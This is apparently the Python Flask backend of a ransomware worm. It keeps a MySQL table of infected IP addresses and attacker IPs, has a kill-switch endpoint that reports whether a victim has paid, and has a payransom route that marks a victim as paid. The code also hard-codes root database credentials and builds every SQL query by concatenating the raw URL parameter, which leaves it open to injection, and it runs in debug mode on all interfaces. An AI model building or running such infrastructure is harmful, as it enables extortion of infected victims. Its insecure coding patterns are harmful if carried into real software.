from flask import Flask
import mysql.connector


mydb = mysql.connector.connect(
	host = '127.0.0.1',
	user = 'root',
	password = 'tooR@#12',
	auth_plugin='mysql_native_password',
	database = 'worm'
	)
mycursor= mydb.cursor()

app = Flask(__name__)

@app.route('/checkIp/<ip>')
def checkIp(ip):
    global mycursor,mydb
    cmd = 'select * from ips where ips=\''+ip+'\';'
    mycursor.execute(cmd)
    for x in mycursor:
        if x != None:
            return {'status':True}
    #returs True if it is infected...
    #inserts into table if not
    cmd = 'insert into ips(ips,ransome) values(\''+ip+'\', False);'
    mycursor.execute(cmd)
    mydb.commit()
    return {'status':False}

@app.route('/attackersIp/<ip>',methods=['POST'])
def attackIp(ip):
    global mycursor,mydb
    cmd = 'insert into attacker_ip(ip) values(\''+ip+'\');'
    mycursor.execute(cmd)
    mydb.commit()
    return {'status':True}

@app.route('/attackersIp/')
def getattack():
    global mycursor,mydb
    cmd = 'select ip from attacker_ip;'
    mycursor.execute(cmd)
    return {'status':mycursor.fetchall()}
@app.route('/killswitch/<ip>')
def kill(ip):
    global mycursor
    cmd = 'select ransome from ips where ips=\''+ip+'\';'
    mycursor.execute(cmd) 
    for x in mycursor:
        return {'status':x}

@app.route('/payransom/<ip>')
def payransom(ip):
    global mycursor, mydb
    cmd = 'update ips set ransome = True where ips = \''+ip+'\';'
    mycursor.execute(cmd)
    mydb.commit()
    return {'status':'done'}
if __name__ == '__main__':
   mycursor.execute('DELETE FROM ips;')
   mycursor.execute('DELETE FROM attacker_ip;')
   mydb.commit()
   app.run(host='0.0.0.0',debug = True)
